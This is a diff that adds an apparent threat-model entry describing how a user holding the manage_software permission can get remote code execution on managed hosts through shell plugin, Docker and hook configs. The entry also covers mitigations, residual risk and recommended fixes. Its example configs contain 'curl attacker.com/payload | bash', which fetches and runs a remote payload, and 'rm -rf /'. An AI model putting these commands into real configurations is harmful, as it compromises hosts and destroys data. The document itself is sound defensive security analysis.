@@ -1,0 +1,164 @@
+# ATK-16: RCE via Plugin Config Manipulation
+
+| Field | Value |
+| --- | --- |
+| Severity | Critical |
+| Attack surface | Plugin system / command execution |
+| Prerequisites | Authenticated user with `manage_software` permission |
+| STRIDE | Elevation of Privilege |
+
+## Attack description
+
+This scenario describes the complete path from authenticated API access to remote
+code execution on managed hosts via plugin configuration manipulation.
+
+### Path 1: Shell plugin
+
+1. The attacker creates a plugin config with `plugin_type = "generic_shell"`:
+
+   ```json
+   {
+     "version_command": "curl attacker.com/payload | bash",
+     "update_command": "curl attacker.com/payload | bash"
+   }
+   ```
+
+2. `ShellConfig::validate()` only checks that at least one field is set — no content
+   restriction on the command strings.
+3. The attacker assigns the plugin config to a software item on target hosts.
+4. On the next scheduled version check, the controller sends the command to the agent
+   via `check_versions`.
+5. The agent executes `bash -c "set -euo pipefail\ncurl attacker.com/payload | bash"`
+   on the managed host.
+
+### Path 2: Docker post_pull_command
+
+1. The attacker creates a Docker plugin config with a malicious `post_pull_command`:
+
+   ```json
+   {
+     "post_pull_command": "curl attacker.com/payload | bash"
+   }
+   ```
+
+2. When the Docker image is updated, the command executes on the agent host.
+
+### Path 3: Custom hook commands
+
+1. The attacker creates or modifies a plugin config to include malicious hooks:
+
+   ```json
+   {
+     "pre_update_commands": ["curl attacker.com/payload | bash"],
+     "post_update_commands": ["rm -rf /"]
+   }
+   ```
+
+2. Or using the structured format:
+
+   ```json
+   {
+     "hooks": {
+       "pre_update": {
+         "commands": ["curl attacker.com/payload | bash"]
+       }
+     }
+   }
+   ```
+
+3. Custom command strings in the `commands` array bypass all content validation.
+4. When an update is triggered, hooks execute before and after the plugin's update
+   operation.
+
+### Path 4: Config override per host
+
+1. The attacker modifies the `config_override` on a host-software-item-plugin
+   assignment to inject hooks for a specific host, even if the base plugin config is
+   clean.
+
+## Worst-case impact
+
+- **Arbitrary code execution on all assigned hosts.** The attacker achieves shell
+  access on every managed host assigned to the affected software item, including
+  SSH-managed remote hosts.
+- **Root-level access.** On hosts where the agent has sudo privileges (via sudoers
+  drop-in or `--allow-all`), the attacker can escalate to root.
+- **Full infrastructure compromise.** With RCE on multiple hosts, the attacker can
+  install persistent backdoors, exfiltrate data, pivot to internal networks, and
+  modify system configurations.
+- **Supply chain poisoning.** The attacker modifies the update pipeline to install
+  attacker-controlled software versions on future updates.
+
+## Current mitigations
+
+- **RBAC authorization.** Plugin config writes require the `manage_software`
+  permission. This permission is granted to the `owner` and `admin` roles but not
+  the `user` role.
+- **Shell escape for substitution variables.** Dynamic values like
+  `{package_identifier}` and `{version}` are shell-escaped via `shell_escape()`
+  before substitution into templates. Injection through substitution variables is
+  not possible.
+- **`Exec` mode for predefined hooks.** Systemd and docker-compose hooks use
+  `CommandSpec::exec()` (direct process argv, no shell interpretation), with
+  validated parameters (character whitelists, path traversal rejection).
+- **Agent runs as unprivileged user.** The agent runs as a non-root user with
+  per-command sudoers entries by default. `--allow-all` (unrestricted sudo) is
+  discouraged in production.
+- **Output capture and limits.** Command output is captured and capped at 10 MB per
+  execution, preventing unbounded resource consumption.
+- **Plugin config encryption at rest.** Plugin configs are stored encrypted in the
+  database via `EncryptedString`, preventing direct database reads from exposing
+  command content.
+
+## Residual risk
+
+- **`manage_software` equals RCE.** This is the fundamental design trade-off: the
+  ability to configure software management necessarily includes the ability to define
+  what commands run on managed hosts. There is no mechanism to grant `manage_software`
+  without also granting effective RCE.
+- **No command content validation.** Shell commands in `version_command`,
+  `update_command`, `post_pull_command`, and custom hook `commands` arrays are
+  accepted verbatim. There is no allowlist, blocklist, or pattern matching.
+- **No change approval workflow.** Plugin config modifications take effect immediately
+  on the next scheduled check or triggered update. There is no second-admin approval,
+  delay, or review step.
+- **Broad blast radius.** A single plugin config modification can affect all hosts
+  assigned to the affected software item across the entire tenant.
+- **SSH agent amplification.** For SSH-managed hosts, the malicious command executes
+  on remote machines through the SSH agent's connection pool, extending the blast
+  radius beyond locally-managed hosts.
+- **Sudoers escalation risk.** On hosts configured with `--allow-all`, the attacker
+  has unrestricted root access. Even with per-command sudoers, the allowed commands
+  (e.g., `apt-get`, `docker`) may be sufficient for privilege escalation.
+
+## Recommended improvements
+
+- Implement a "command change review" workflow where modifications to command-bearing
+  plugin config fields require approval from a second administrator before taking
+  effect.
+- Add a distinct permission (e.g., `manage_commands`) separate from `manage_software`
+  that specifically controls the ability to modify command-bearing fields. Users with
+  `manage_software` but not `manage_commands` could manage software items and version
+  tracking but not alter what executes on hosts.
+- Implement an immutable audit log for all plugin config changes, with special
+  attention to command-bearing fields, including the full before/after diff and the
+  acting user's identity.
+- Add a "dry run" mode that shows what commands would execute on which hosts before
+  committing a plugin config change.
+- Consider an optional command allowlist or blocklist per tenant that restricts the
+  shell commands that can be configured (e.g., only commands matching approved
+  patterns or prefixes).
+- Document prominently that `manage_software` permission should be treated as
+  equivalent to root access on all managed hosts.
+
+## References
+
+- [ATK-08: Shell Injection via Plugins](08-shell-injection-plugins.md)
+- [ATK-17: RCE on Agents via Compromised Controller](17-rce-controller-to-agent.md)
+- [Secure Development — Plugin Input Validation](../security/secure-development.md#plugin-input-validation)
+- [Plugin Guidelines](../development/plugin-guidelines.md)
+- [Update Hooks](../development/update-hooks.md)
+- `crates/plugins/generic/shell/src/config.rs` — `ShellConfig::validate()`
+- `crates/plugins/releases/docker/src/plugin.rs` — `post_pull_command` execution
+- `crates/shared/update-hooks/src/lib.rs` — hook resolution
+- `crates/shared/command/src/command.rs` — command execution
